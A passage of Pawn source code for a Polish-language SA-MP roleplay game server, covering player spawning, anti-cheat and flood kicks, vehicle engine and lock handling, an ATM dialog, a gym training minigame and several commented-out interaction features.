		SetSpawnInfoFix(playerid, 0, PlayerCache[playerid][pSkin],PlayerCache[playerid][pJailX], PlayerCache[playerid][pJailY],PlayerCache[playerid][pJailZ]);
	}
	else if(PlayerCache[playerid][pPosX] != 0 && PlayerCache[playerid][pPosY] != 0 && PlayerCache[playerid][pPosZ] != 0)
	{
		SetSpawnInfoFix(playerid, 0, PlayerCache[playerid][pSkin],PlayerCache[playerid][pPosX], PlayerCache[playerid][pPosY], PlayerCache[playerid][pPosZ]);
		SetPlayerVirtualWorld(playerid, PlayerCache[playerid][pPosVW]);
	}
	else if(PlayerCache[playerid][pHouseSpawn] != 0)
	{
		new duid = PlayerCache[playerid][pHouseSpawn];
	//	SetSpawnInfoFix(playerid, 0, PlayerCache[playerid][pSkin],DoorCache[duid][dInsX], DoorCache[duid][dInsY], DoorCache[duid][dInsZ]);
		//SetPlayerVirtualWorld(playerid, DoorCache[duid][dInsVW]);
	}
	else
	{
		SetSpawnInfoFix(playerid, 0, PlayerCache[playerid][pSkin],1021.1641,-1311.5492,13.5469);
		SetPlayerVirtualWorld(playerid, 0);
	}
	for(new i; i<MAX_ANIMS; i++)
	{
		if(!Isnull(AnimList[i][aName]))
		ApplyAnimation(playerid, AnimList[i][aLib], " ", 4.1, 0, 0, 0, 0, 0, 0);
	}
	if(PlayerCache[playerid][pBW_Time])
	{
		TogglePlayerControllable(playerid, 0);
		ApplyAnimation(playerid, "crack", "crckdeth1", 4.1, 0, 0, 0, 1, 0, 0);
		SetPlayerCameraPos(playerid, PlayerCache[playerid][pPosX], PlayerCache[playerid][pPosY], PlayerCache[playerid][pPosZ]+10.0);
		SetPlayerCameraLookAt(playerid, PlayerCache[playerid][pPosX], PlayerCache[playerid][pPosY], PlayerCache[playerid][pPosZ], CAMERA_CUT);
		new msg[64];
		format(msg, sizeof(msg),  "Stan nieprzytomnosci: %dmin", PlayerCache[playerid][pBW_Time]);
		PlayerTextDrawShow(playerid, BWTextDraw[playerid]);
	}
	else if(PlayerCache[playerid][pTutorialLevel])
	{
		TogglePlayerControllable(playerid, 0);
		SetPlayerPos(playerid, 1021.3134,-1311.0098,13.5469);
		SetPlayerCameraPos(playerid, 1021.1658,-1315.8075,13.3837);
		SetPlayerCameraLookAt(playerid,  1021.1641,-1311.5492,13.5469);
		SetPlayerFacingAngle(playerid, 181.1900);
		ChooseSkinTimer[playerid] = SetTimerEx("ChooseSkin", 120, true, "i", playerid);
		PlayerTextDrawSetString(playerid, BottomTextDraw[playerid], "~y~Wybierz skin postaci~w~~n~~n~~b~~h~~h~~h~lewo ~w~poprzedni skin~n~~b~~h~~h~~h~prawo ~w~nastepny skin~n~~n~~b~~h~~h~~h~LALT~w~ ~g~~h~akceptuj");
		PlayerTextDrawShow(playerid, BottomTextDraw[playerid]);
		
	}
	SpawnPlayer(playerid);
	return 1;
}

public OnPlayerGiveDamage(playerid, damagedid, Float:amount, weaponid, bodypart)
{
	if(WeaponCache[playerid][wcVal] != weaponid && weaponid != 0)
	{
		new str[128]; format(str, sizeof(str), "Weapon Cheat (C) weaponid %d",weaponid);
		return !KickPlayer(playerid, "System", str);
	}
	return 1;
}

new restarttime = 10, restartstr[64];

cmd:gmx (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] < ADMINISTRATION)
	return 1;
	format(restartstr, sizeof(restartstr), "~w~restart serwera za:~n~ ~b~~h~%d~w~ sek", restarttime);
	GameTextForAll(restartstr, 1000, 4);
	restarttime--;
	SetTimer("RestartServer", 1000, true);
	return 1;
}

forward RestartServer();
public RestartServer()
{
	if(restarttime == 0)
	{
		SendRconCommand("gmx");
		return 1;
	}
	format(restartstr, sizeof(restartstr), "~w~restart serwera za:~n~ ~b~~h~%d~w~ sek", restarttime);
	GameTextForAll(restartstr, 1000, 4);
	restarttime--;
	return 1;
}

new gcount[MAX_PLAYERS];

public OnPlayerCommandReceived(playerid,  cmd[],  params[], flags)
{



	if(!PlayerCache[playerid][pUID])
	return 0;
	if(pTick[playerid] == GetTickCount())
	gcount[playerid]++;
	if(gcount[playerid] == 5)
	{
		KickPlayer(playerid, "System", "Flood (A)");
		gcount[playerid] = 0;
	}
	if(GetTickCount() - pTick[playerid] <= 250)
	{
		pTick[playerid] = GetTickCount();
		return !SendClientMessage(playerid, COLOR_GRAY, "Poczekaj chwilê.");
	}
	pTick[playerid] = GetTickCount();
	if(cmd[0] == '/')
	{
		if(PlayerCache[playerid][pBW_Time])
		return SendClientMessage(playerid, COLOR_GRAY, "Nie mo¿esz tego zrobiæ podczas trwania BW.");
		new string[16]; format(string, sizeof(string), cmd);
		strdel(string, 0, 1);
		for(new i=0; i<MAX_ANIMS; i++)
		{
			if(Isnull(AnimList[i][aName]))
			return !TextDrawForPlayerEx(playerid, 1, "Nie znaleziono animacji.", 3000);
			if(!strcmp(string, AnimList[i][aCustomName], true))
			{
				return !ApplyAnimation(playerid, AnimList[i][aLib], AnimList[i][aName], 4.1, AnimList[i][aRepeat], AnimList[i][aLockX], AnimList[i][aLockY], AnimList[i][aFreeze], AnimList[i][aTime], 0);
			}
		}
	}
	if(pBus[playerid])
	return !SendClientMessage(playerid, COLOR_GRAY, "Nie mo¿esz teraz tego zrobiæ.");
	if(PlayerCache[playerid][pAJ_Time] && PlayerCache[playerid][pLevel] == 0)
	return 0;
	return 1;
}

stock ShowDialogATM(playerid)
{
	new str[128]; format(str, sizeof(str), ""HEX_WHITE"Stan konta bankowego:\t"HEX_GREEN"%d$"HEX_WHITE"\n-\n1\tWyp³aæ œrodki\n2\tWp³aæ œrodki", PlayerCache[playerid][pBank]);
	return ShowPlayerDialog(playerid, D_ATM, DIALOG_STYLE_LIST, "Bankomat", str, "Wybierz", "Anuluj");
}

stock RPName(playerid)
{
	new name[MAX_PLAYER_NAME]; GetPlayerName(playerid, name, sizeof(name));
	for(new i; i<strlen(name); i++)
	{
		if(name[i] == '_')
		{
			name[i] = ' ';
		}
	}
	return name;
}

forward TurnOnEngine(vehicleid, playerid);
public TurnOnEngine(vehicleid, playerid)
{
	if( PlayerCache[playerid][pCurrentVehicle][vBanCost])
	{
		PlayerCache[playerid][pCurrentVehicle][vTimer] = 0;
		PlayerTextDrawSetString(playerid, VehicleInfo[playerid], "~b~~h~~h~~h~LCTRL ~w~by uruchomic silnik~n~~b~~h~~h~~h~LPM ~w~by zapalic swiatla");
		PlayerTextDrawShow(playerid, VehicleInfo[playerid]);
		new msg[256];
		format(msg, sizeof(msg), "Nie mo¿esz uruchomiæ pojazdu bo posiada on blokadê na ko³o.\nKoszt zdjêcia: $%d\n\nNotka: %s\nSkontaktuj siê z policj¹ by odblokowaæ ko³o.",  PlayerCache[playerid][pCurrentVehicle][vBanCost],
		PlayerCache[playerid][pCurrentVehicle][vBanReason]);
		return ShowDialogInfo(playerid, msg);
	}
	if( PlayerCache[playerid][pCurrentVehicle][vHP] <= 300.0)
	{
		PlayerCache[playerid][pCurrentVehicle][vTimer] = 0;
		PlayerTextDrawSetString(playerid, VehicleInfo[playerid], "~b~~h~~h~~h~LCTRL ~w~by uruchomic silnik~n~~b~~h~~h~~h~LPM ~w~by zapalic swiatla");
		PlayerTextDrawShow(playerid, VehicleInfo[playerid]);
		new msg[128]; format(msg, sizeof(msg), "* %s próbuje uruchomiæ silnik w %s, ale stan techniczny pojazdu na to nie pozwala. *", RPName(playerid), GetVehicleName(GetVehicleModel(GetPlayerVehicleID(playerid))));
		ShowDialogInfo(playerid, "Stan techniczny pojazdu jest w kiepskim stanie.\nSkorzystaj z zestawu naprawczego by naprawiæ pojazd lub wezwij holownik.");
		Do(playerid, msg);
	}
	if( PlayerCache[playerid][pCurrentVehicle][vFuel] == 0)
	{
		PlayerCache[playerid][pCurrentVehicle][vTimer] = 0;
		PlayerTextDrawSetString(playerid, VehicleInfo[playerid], "~b~~h~~h~~h~LCTRL ~w~by uruchomic silnik~n~~b~~h~~h~~h~LPM ~w~by zapalic swiatla");
		PlayerTextDrawShow(playerid, VehicleInfo[playerid]);
		return TextDrawForPlayerEx(playerid, 1, "W pojezdzie skonczylo sie paliwo.", 3000);
	}
	SetVehicleParamsEx( PlayerCache[playerid][pCurrentVehicle][vID],  PlayerCache[playerid][pCurrentVehicle][vEngine]=1,  PlayerCache[playerid][pCurrentVehicle][vLights],  PlayerCache[playerid][pCurrentVehicle][vAlarm],  PlayerCache[playerid][pCurrentVehicle][vDoors],  PlayerCache[playerid][pCurrentVehicle][vBonnet], PlayerCache[playerid][pCurrentVehicle][vBoot],  PlayerCache[playerid][pCurrentVehicle][vObjective]);
	PlayerCache[playerid][pCurrentVehicle][vTimer] = 0;
	return 1;
}

stock ShowDialogGroupOptions(playerid, groupuid)
{
	new list[525]; format(list, sizeof(list), "1\tZmieñ kolor grupy\n2\t%sPrze³¹cz czat OOC\n3\t%sPrze³¹cz czat IC\n4\tDomyœlna wyp³ata: "HEX_BLUE"$%d", GroupCache[groupuid][gChatOOC] ? (""HEX_GREEN"") : (""HEX_RED""), GroupCache[groupuid][gChatIC] ? (""HEX_GREEN"") : (""HEX_RED""), GroupCache[groupuid][gPayDay]);
	return ShowPlayerDialog(playerid, D_GROUP_OPTIONS, DIALOG_STYLE_LIST, "Ustawienia grupy", list, "Wybierz", "Anuluj");
}

stock IsPlayerInRangeOfPlayer(playerid, targetid, Float:range)
{
	if(GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(targetid))
	return 0;
	new Float:X, Float:Y, Float:Z; GetPlayerPos(targetid, X, Y, Z);
	if(IsPlayerInRangeOfPoint(playerid, range, X, Y, Z))
	return 1;
	return 0;
}

forward TrainingTimer(playerid);
public TrainingTimer(playerid)
{
	new keys, ud, lr;
	GetPlayerKeys(playerid, keys, ud, lr);
	if(keys & KEY_SECONDARY_ATTACK)
	{
		ApplyAnimation(playerid, "benchpress", "gym_bp_down", 4.1, 0, 0, 0, 1, 0);
		RemovePlayerAttachedObject(playerid, ATTACH_SLOT_CASK);
		ClearAnimations(playerid);
		PlayerTextDrawHide(playerid, BottomTextDraw[playerid]);
		pTrainingState[playerid] = 0;
		pTrainingExtrude[playerid] = 0;
		pHoldingBar[playerid] = 0;
		KillTimer(pTrainingTimer[playerid]);
		pTrainingTimer[playerid] = 0;
	}
	else if(keys & KEY_SPRINT && pTrainingState[playerid] != TRAINING_STATE_DOWN && pTrainingState[playerid] != TRAINING_STATE_DONE)
	{
		if(pTrainingState[playerid] == 0)
		ApplyAnimation(playerid, "benchpress", "gym_bp_up_A", 4.1, 0, 0, 0, 1, 0);

		pTrainingState[playerid] = TRAINING_STATE_UP;
		pHoldingBar[playerid]++;

		if(pHoldingBar[playerid] == 8)
		{
			pHoldingBar[playerid] = 0;
			pTrainingExtrude[playerid]++;
			pTrainingState[playerid] = TRAINING_STATE_DONE;
			new msg[256];
			format(msg, sizeof(msg), "~y~%d ~w~wycisniec~n~~n~Przytrzymaj SPRINT by wycisnac sztange.~n~Wycisnij sztange 100 razy by zwiekszyc swoja sile.~n~~n~Nacisnij ~r~~h~ENTER ~w~by anulowac.", pTrainingExtrude[playerid]);
			PlayerTextDrawSetString(playerid, BottomTextDraw[playerid], msg);
			PlayerTextDrawShow(playerid, BottomTextDraw[playerid]);
			if(pTrainingExtrude[playerid] == 100)
			{
				PlayerTextDrawHide(playerid, BottomTextDraw[playerid]);
				
				pTrainingState[playerid] = 0;
				pTrainingExtrude[playerid] = 0;
				pHoldingBar[playerid] = 0;
				KillTimer(pTrainingTimer[playerid]);
				pTrainingTimer[playerid] = 0;
				ApplyAnimation(playerid, "benchpress", "gym_bp_getoff", 4.1, 0, 0, 0, 0, 0);
				new h, m, s;
				PlayerCache[playerid][pLastTraining] = gettime(h, m, s);
				h = PlayerCache[playerid][pLastTraining] - PlayerCache[playerid][pGymBoostTime];
				h /= 60;
				h /= 60;
				new last_strenght = PlayerCache[playerid][pStrenght];
				if(h <= 60 && PlayerCache[playerid][pGymBoostTime])
				PlayerCache[playerid][pStrenght]+=4;
				else
				PlayerCache[playerid][pStrenght]+=2;
				last_strenght = PlayerCache[playerid][pStrenght]-last_strenght;

				RemovePlayerAttachedObject(playerid, ATTACH_SLOT_CASK);
				new info[256]; format(info, sizeof(info), "Zakoñczono trening.\nNastêpny trening mo¿esz odbyæ za 16h od momentu ukoñczenia tego treningu.\n\nTwoja si³a zwiêkszy³a siê o %dj!\nAktualna si³a: %dj.", last_strenght, PlayerCache[playerid][pStrenght],
				PlayerCache[playerid][pStrenght]);
				for(new i; i<MAX_ITEMS; i++)
				{
					if(ItemCache[i][iState] == 0)
					{
						if(ItemCache[i][iActive])
						{
							if(ItemCache[i][iType] == 16)
							{
								if(ItemCache[i][iOwner] == PlayerCache[playerid][pUID])
								{
									ItemCache[i][iState] = ITEM_STATE_DESTROYED;
									ItemCache[i][iActive] = 0;
								}
							}
						}
					}
				}
				return ShowDialogInfo(playerid, info);
			}
		}
	}
	else if(pTrainingState[playerid] == TRAINING_STATE_DONE && keys != KEY_SPRINT)
	{
		pTrainingState[playerid] = TRAINING_STATE_DOWN;
		ApplyAnimation(playerid, "benchpress", "gym_bp_down", 4.1, 0, 0, 0, 1, 0);
		SetTimerEx("TrainingState0", 1000, false, "i", playerid);
	}
	else if(pTrainingState[playerid] == TRAINING_STATE_UP && keys != KEY_SPRINT)
	{
		pHoldingBar[playerid] = 0;
		pTrainingState[playerid] = TRAINING_STATE_DOWN;
		GameTextForPlayer(playerid, "~r~~h~nie puszczaj sztangi", 3000, 4);

		ApplyAnimation(playerid, "benchpress", "gym_bp_down", 4.1, 0, 0, 0, 1, 0);
		SetTimerEx("TrainingState0", 3000, false, "i",playerid);
	}
	return 1;
}

forward TrainingState0(playerid);
public TrainingState0(playerid)
pTrainingState[playerid] = TRAINING_STATE_NONE;

public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
	if(PlayerCache[playerid][pBW_Time])
	return 1;
	if(newkeys == KEY_CTRL_BACK && !IsPlayerInAnyVehicle(playerid))
	{
		new targetid = GetPlayerCameraTargetPlayer(playerid);
		if(targetid != INVALID_PLAYER_ID)
		{
			if(IsPlayerInRangeOfPlayer(playerid, targetid, 2.5))
			{
				pVal[playerid] = targetid;
				new header[64]; format(header, sizeof(header), "Interakcja z: %s(%d).", RPName(targetid), targetid);
				return ShowPlayerDialog(playerid, D_INTERRACT_PLAYER, DIALOG_STYLE_LIST, header,
				""HEX_WHITE"1\tPoca³uj\n\
				"HEX_WHITE"2\tPrzytul\n\
				"HEX_WHITE"3\tPodaj rêkê\n\
				"HEX_BLUE"4\tPomó¿\n\
				"HEX_WHITE"5\tU¿yj kajdanek",
				"Wybierz", "Anuluj");
			}
		}
	}
	else if(newkeys & KEY_WALK)
	{
		if(!Isnull(PlayerCache[playerid][pFavAnim]))
		{
			new str[16]; format(str, sizeof(str), PlayerCache[playerid][pFavAnim]);
			for(new i; i<MAX_ANIMS; i++)
			{
				if(!Isnull(AnimList[i][aName]))
				{
					if(!strcmp(AnimList[i][aCustomName], str, true))
					{
						
						return ApplyAnimation(playerid, AnimList[i][aLib], AnimList[i][aName], 4.1, AnimList[i][aRepeat], 0, 0, AnimList[i][aFreeze], 0, 0);
					}
				}
			}
		}
	}
	else if(newkeys & KEY_ACTION)
	{
		if(IsPlayerInAnyVehicle(playerid))
		{
			if(GetPlayerVehicleSeat(playerid) != 0)
			return 1;
			new vid = GetPlayerVehicleID(playerid);
			if(GetVehicleModel(vid) == 481 || GetVehicleModel(vid) == 509 || GetVehicleModel(vid) == 510)
			return 1;
			
		
			


			if(!HasPlayerAccessToVehicle(playerid, vid))
				return TextDrawForPlayerEx(playerid, 1, "Nie posiadasz kluczy do tego pojazdu.", 1500);

			if( PlayerCache[playerid][pCurrentVehicle][vEngine] && !PlayerCache[playerid][pBW_Time])
			{
				PlayerTextDrawSetString(playerid, VehicleInfo[playerid], "~b~~h~~h~~h~LCTRL ~w~by uruchomic silnik~n~~b~~h~~h~~h~LPM ~w~by zapalic swiatla");
				PlayerTextDrawShow(playerid, VehicleInfo[playerid]);
				SetVehicleParamsEx(vid,  PlayerCache[playerid][pCurrentVehicle][vEngine]=0,  PlayerCache[playerid][pCurrentVehicle][vLights],  PlayerCache[playerid][pCurrentVehicle][vAlarm],  PlayerCache[playerid][pCurrentVehicle][vDoors],  PlayerCache[playerid][pCurrentVehicle][vBonnet], PlayerCache[playerid][pCurrentVehicle][vBoot],  PlayerCache[playerid][pCurrentVehicle][vObjective]);
				return SendPlayerMe(playerid, "przekrêca kluczyk w stacyjce.");
			}
			else if( PlayerCache[playerid][pCurrentVehicle][vTimer] == 0 && !PlayerCache[playerid][pBW_Time])
			{
				PlayerCache[playerid][pCurrentVehicle][vTimer] = SetTimerEx("TurnOnEngine", 3000, false, "ii", vid, playerid);
				PlayerTextDrawSetString(playerid, VehicleInfo[playerid], "~y~Trwa uruchamianie silnika..");
				PlayerTextDrawShow(playerid, VehicleInfo[playerid]);
				return SendPlayerMe(playerid, "przekrêca kluczyk w stacyjce.");
			}
		}
		return 1;
	}
	/*
	else if(newkeys & KEY_YES)
	{
		new objid = GetPlayerCameraTargetDynObject(playerid);
		if(objid)
		{
			new query[256], ownerType, owner, Float:x, Float:y, Float:z, Float:rx, Float:ry, 
			Float:rz, Float:db_x, Float:db_y, Float:db_z, Float:db_rx, Float:db_ry, Float:db_rz, gate;
			new Float:X, Float:Y, Float:Z;
			GetDynamicObjectPos(objid, X, Y, Z);
			if(IsPlayerInRangeOfPoint(playerid, 10, X, Y, Z))
			{
				format(query, sizeof(query), "SELECT X, Y, Z, rX, rY, rZ, gate, owner, ownerType, gateX, gateY, gateZ, gaterX, gaterY, gaterZ FROM objects WHERE ID = '%d' LIMIT 1", objid);
				new Cache:cache = mysql_query(DB_HANDLE, query);
				
				new Float:RX, Float:RY, Float:RZ;
				GetDynamicObjectRot(objid, RX, RY, RZ);


				cache_get_value_name_float(0, "X", x);
				cache_get_value_name_float(0, "Y", y);
				cache_get_value_name_float(0, "Z", z);
				cache_get_value_name_float(0, "rX", rx);
				cache_get_value_name_float(0, "rY", ry);
				cache_get_value_name_float(0, "rZ", rz);
				cache_get_value_name_int(0, "gate", gate);	
				cache_get_value_name_int(0, "ownerType", ownerType);	
				cache_get_value_name_float(0, "gateX", db_x);	
				cache_get_value_name_float(0, "gateY", db_y);	
				cache_get_value_name_float(0, "gateZ", db_z);	
				cache_get_value_name_float(0, "gaterX", db_rx);	
				cache_get_value_name_float(0, "gaterY", db_ry);	
				cache_get_value_name_float(0, "gaterZ", db_rz);	

				cache_delete(cache);
				if(gate)
				{
					if(ownerType == 1)
					{
						if(PlayerCache[playerid][pUID] != owner)
						return TextDrawForPlayerEx(playerid, 1, "Brak uprawnien.", 3000);
					}
					if(ownerType == 2)
					{
						if(PlayerCache[playerid][pGroup] == owner)
						{

						}
						else if(PlayerCache[playerid][pGroup2] == owner)
						{
							
						}
						else if(PlayerCache[playerid][pGroup3] == owner)
						{
							
						}
						else
						return TextDrawForPlayerEx(playerid, 1, "Brak uprawnien.", 3000);
					}
					if(IsDynamicObjectMoving(objid))
					return TextDrawForPlayerEx(playerid, 1, "Brama aktualnie sie porusza!", 3000);
					if(X == x + db_x && Y == y + db_y &&Z == z + db_z && RX == rx + db_rx &&  RY == ry + db_ry &&RZ == rz + db_rz)
					{
						TextDrawForPlayerEx(playerid, 1, "Brama ~r~~h~zamknieta~w~.", 3000);
						return MoveDynamicObject(objid,x, y, z, 4.1,  rx,  ry, rz);
					}
					MoveDynamicObject(objid,X+db_x, Y+db_y, Z+db_z, 4.1, RX+db_rx,  RY+db_ry,  RZ+db_rz);
					return TextDrawForPlayerEx(playerid, 1, "Brama ~g~~h~~h~otwarta~w~.", 3000);
				}
			}
		}
		/*if(ObjectCache[ouid][oModel] == 2629)
		{
			for(new i; i<MAX_ITEMS; i++)
			{
				if(ItemCache[i][iState] == ITEM_STATE_EQ)
				{
					if(ItemCache[i][iOwner] == PlayerCache[playerid][pUID])
					{
						if(ItemCache[i][iType] == 16)
						{
							if(ItemCache[i][iActive])
							{
								if(pTrainingTimer[playerid])
								return 1;
								new h, m, s, timestamp = gettime(h, m, s);
								new seconds = timestamp - PlayerCache[playerid][pLastTraining];
								new minutes = seconds/60;
								new hours = minutes/60;
								if(hours < 16 && PlayerCache[playerid][pLastTraining])
								return ShowDialogInfo(playerid, "Nastêpny trening mo¿esz rozpocz¹æ 16h od momentu skoñczenia ostatniego treningu.");
								SetPlayerPos(playerid, ObjectCache[ouid][oX], ObjectCache[ouid][oY]+1, ObjectCache[ouid][oZ]+0.5);
								ApplyAnimation(playerid, "benchpress", "gym_bp_geton", 4.1, 0, 0, 0, 1, 0);
								SetPlayerAttachedObject(playerid, ATTACH_SLOT_CASK, 2913, 6, 0.034999,0.042000, -0.069999,0.000009,
								-0.999999, 5.000002, 1, 1, 1, 0, 0);
								SetPlayerFacingAngle(playerid, ObjectCache[ouid][orZ]);
								
								PlayerTextDrawSetString(playerid, BottomTextDraw[playerid], "Przytrzymaj ~b~~h~SPRINT ~w~by podniesc sztange~n~~n~Nacisnij ~r~~h~ENTER ~w~by anulowac");
								PlayerTextDrawShow(playerid, BottomTextDraw[playerid]);

								pTrainingState[playerid] = TRAINING_STATE_DOWN;
								pHoldingBar[playerid] = 0;


								SetTimerEx("TrainingState0", 3000, false, "i",playerid);

								pTrainingTimer[playerid] = SetTimerEx("TrainingTimer", 125, true, "i", playerid);
								return 1;
							}
						}
					}
				}
			}
			return ShowDialogInfo(playerid, "Nie posiadasz karnetu si³owego lub jest on nieaktywny.\nZdob¹dŸ karnet lub aktywuj go i wtedy zacznij æwiczyæ,");
		}*/
		/*if(ObjectCache[ouid][oModel] == 1257)
		{
			if(IsPlayerInRangeOfPoint(playerid, 5.0, ObjectCache[ouid][oX],  ObjectCache[ouid][oY],  ObjectCache[ouid][oZ]))
			{
				new info[64], list[725], count;
				for(new i; i<MAX_OBJECTS; i++)
				{
					if(ObjectCache[i][oState] == 0)
					{
						if(ObjectCache[i][oModel] == 1257)
						{
							if(!IsPlayerInRangeOfPoint(playerid, 5.0, ObjectCache[i][oX],  ObjectCache[i][oY],  ObjectCache[i][oZ]))
							{
								format(info, sizeof(info), "%d\t%s\n", ObjectCache[i][oUID], ObjectCache[i][oName]);
								strins(list, info, strlen(list));
								count++;
							}
						}
					}
				}
				if(count)
				{
					SendPlayerMe(playerid, "sprawdza listê przystanków autobusowych.");
					return ShowPlayerDialog(playerid, D_BUS, DIALOG_STYLE_LIST, "Wybierz przystanek", list, "Wybierz", "Anuluj");
				}
				return ShowDialogInfo(playerid, "Nie znaleziono innych przystanków autobusowych.");
			}
		}
		if(IsPlayerInAnyVehicle(playerid))
		{
			if(GetPlayerVehicleSeat(playerid) == 0)
			{
				new vehicleid = GetPlayerVehicleID(playerid);
				if(GetVehicleModel(vehicleid) == 525)
				{
					if( PlayerCache[playerid][pCurrentVehicle][vEngine])
					{
						if(IsTrailerAttachedToVehicle(vehicleid))
						{
							new trailerid = GetVehicleTrailer(vehicleid);
							new Float:posX, Float:posY, Float:posZ, Float:angle, virtualWorld;

							GetVehiclePos(trailerid, posX, posY, posZ);
							GetVehicleZAngle(trailerid, angle);
							virtualWorld = GetVehicleVirtualWorld(trailerid);

							DetachTrailerFromVehicle(vehicleid);

							new str[128];
							format(str, sizeof(str), "Odholowano pojazd marki ~b~~h~~h~~h~%s~w~.", GetVehicleName(GetVehicleModel(trailerid)));
							TextDrawForPlayerEx(playerid, 1, str, 5000);
							
							format(str, sizeof(str), "UPDATE vehicles SET posX=%f, posY=%f, posZ=%f, virtualWorld=%d, angle=%f WHERE gameId = %d",
							posX, posY, posZ, virtualWorld, angle, trailerid);
							mysql_query(DB_HANDLE, str, false);

							return 1;
						}

						new str[128];
						new targetvid = GetPlayerCameraTargetVehicle(playerid);

						if(targetvid == INVALID_VEHICLE_ID)
						return TextDrawForPlayerEx(playerid, 1, "Skieruj kamere na ~b~~h~~h~~h~pojazd~w~ aby go zaczepic.", 3000);
						new Float:X, Float:Y, Float:Z;
						GetVehiclePos(targetvid, X, Y, Z);
						if(!IsPlayerInRangeOfPoint(playerid, 7.5, X, Y, Z))
							return TextDrawForPlayerEx(playerid, 1, "Ten pojazd jest zbyt daleko! Podjedz blizej.", 5000);

							//return TextDrawForPlayerEx(playerid, 1, "Silnik w pojezdzie, ktory chcesz odholowac jest ~y~zapalony~w~.", 3000);

						AttachTrailerToVehicle(targetvid, vehicleid);
						format(str, sizeof(str), "Zaczepiono pojazd marki ~b~~h~~h~~h~%s~w~.", GetVehicleName(GetVehicleModel(targetvid)) );
						return TextDrawForPlayerEx(playerid, 1, str, 3000);
					}
					return ShowDialogInfo(playerid, "W³¹cz silnik.");
				}
			}
		}
		if(GetPlayerCameraTargetVehicle(playerid) != INVALID_VEHICLE_ID)
		{
			new vehicleid = GetPlayerCameraTargetVehicle(playerid);
			new Float:vX, Float:vY, Float:vZ;
			GetVehiclePos(vehicleid, vX, vY, vZ);
			if(IsPlayerInRangeOfPoint(playerid, 5.0, vX, vY, vZ))
			{
				if(!HasPlayerAccessToVehicle(playerid, vehicleid)){
					TextDrawForPlayerEx(playerid, 1, "~r~~h~Nie posiadasz kluczy do tego pojazdu", 3000);
					return ClearAnimations(playerid);
				}
			
				ApplyAnimation(playerid, "BD_FIRE", "wash_up", 4.1, 0, 0, 0, 0, 0, 0);
				PlayerPlaySound(playerid, 24600, 0.0, 0.0, 0.0);
				if( PlayerCache[playerid][pCurrentVehicle][vOpen])
				{
					SendPlayerMe(playerid, "zamyka pojazd.");
					PlayerCache[playerid][pCurrentVehicle][vOpen]=0;
					return GameTextForPlayer(playerid, "~w~Pojazd ~r~~h~zamkniety", 3000, 4);
				}
				else
				{
					SendPlayerMe(playerid, "otwiera pojazd.");
					PlayerCache[playerid][pCurrentVehicle][vOpen]=1;
					return GameTextForPlayer(playerid, "~w~Pojazd ~g~~h~otwarty", 3000, 4);
				}	
			}
			return 1;
		}
		if(GetPlayerCameraTargetDynActor(playerid) != 0)
		{
			new auid = GetActorUID(GetPlayerCameraTargetDynActor(playerid));

			if(IsPlayerInRangeOfPoint(playerid, 3.0, ActorCache[auid][aPosX], ActorCache[auid][aPosY], ActorCache[auid][aPosZ]))
			{
				new msg[825];
				if(ActorCache[auid][aType] == 1)
				{
					format(msg, sizeof(msg), "%s mówi: Witam, w czym mogê pomóc?", strreplace(ActorCache[auid][aName], '_', ' '));
					ShowPlayerDialog(playerid, D_GOVERMENT, DIALOG_STYLE_LIST, "Urz¹d", "1\tWyrób dowód osobisty"HEX_WHITE"\n2\tWyrób prawo jazdy\n3\tZakup rejestracjê pojazdu", "Wybierz", "Anuluj");
				}
				else if(ActorCache[auid][aType] == 2)
				{
					format(msg, sizeof(msg), "%s mówi: Witam, w czym mogê pomóc?", strreplace(ActorCache[auid][aName], '_', ' '));
					ShowPlayerDialog(playerid, D_BANK, DIALOG_STYLE_LIST, "Bank", "1\tOtwórz konto bankowe", "Wybierz", "Anuluj");
				}
				else if(ActorCache[auid][aType] == 3)
				return ShowPlayerDialog(playerid, D_MEDIC, DIALOG_STYLE_LIST, "Lekarz", ""HEX_GREEN"$50"HEX_WHITE"\tZakup lek", "Wybierz", "Anuluj");
				else if(ActorCache[auid][aType] == 4)
				format(msg, sizeof(msg), "%s mówi: %s", strreplace(ActorCache[auid][aName], '_', ' '), ActorCache[auid][aText]);
				else
				{
					new rand = random(3);
					switch(rand)
					{
						case 0: format(msg, sizeof(msg), "%s mówi: M¹dra osoba rzek³a kiedyœ.. 'Nie warto byæ tak dobrym dla drugiego cz³owieka bo ta osoba póŸniej zaczyna oczekiwaæ zbyt wiele i ka¿de uchylenie nastroju czy niepoprawny wystêpek jest jak nó¿ wbity w plecy samemu sobie.'", strreplace(ActorCache[auid][aName], '_', ' '));
						case 1: format(msg, sizeof(msg), "%s mówi: Los Santos to doœæ du¿e miasto, zawsze wiele siê dzieje.", strreplace(ActorCache[auid][aName], '_', ' '));
						case 2: format(msg, sizeof(msg), "%s mówi: Mam znajomego, który interesuje siê programowaniem czy coœ.. ma nawet swój w³asny serwer pomocniczy dla graczy. Nie lubiê go.", strreplace(ActorCache[auid][aName], '_', ' '));
					}
				}
				if(strlen(msg) >= 100)
				{
					new temp1[825], temp2[825];
					temp1 = msg, temp2=msg;
					strdel(temp1, 100, strlen(temp1));
					strins(temp1, "...", strlen(temp1));
					strdel(temp2, 0, 100);
					strins(temp2, "...", 0);
					SendClientMessage(playerid, CHAT_SHADE_2, temp1);
					return SendClientMessage(playerid, CHAT_SHADE_2, temp2);
				}
				return SendClientMessage(playerid, CHAT_SHADE_2, msg);
			}
		}
		new objectid = GetPlayerCameraTargetDynObject(playerid);
		new objuid = GetObjectUID(objectid);
		if(ObjectCache[objuid][oModel] == 19324 || ObjectCache[objuid][oModel] == 2942 || ObjectCache[objuid][oModel] == 2754)
		{
			if(IsPlayerInRangeOfPoint(playerid, 1.5, ObjectCache[objuid][oX], ObjectCache[objuid][oY], ObjectCache[objuid][oZ]))
			{
				if(!PlayerCache[playerid][pBankAccount])
				return ShowDialogInfo(playerid, "Nie posiadasz konta bankowego, udaj siê do banku by utworzyæ konto!");
				ApplyAnimation(playerid, "dealer", "shop_pay", 4.1, 0, 0, 0, 0, 0, 0);
				SendPlayerMe(playerid, "korzysta z bankomatu.");
				return ShowDialogATM(playerid);
			}
		}
		if(ObjectCache[objuid][oGate])
		{
			new Float:ox, Float:oy, Float:oz, Float:rx, Float:ry, Float:rz;
			if(IsDynamicObjectMoving(objectid))
			return TextDrawForPlayerEx(playerid, 1, "Brama aktualnie sie porusza!", 3000);
			if(ObjectCache[objuid][oOwnerType] == 1)
			{
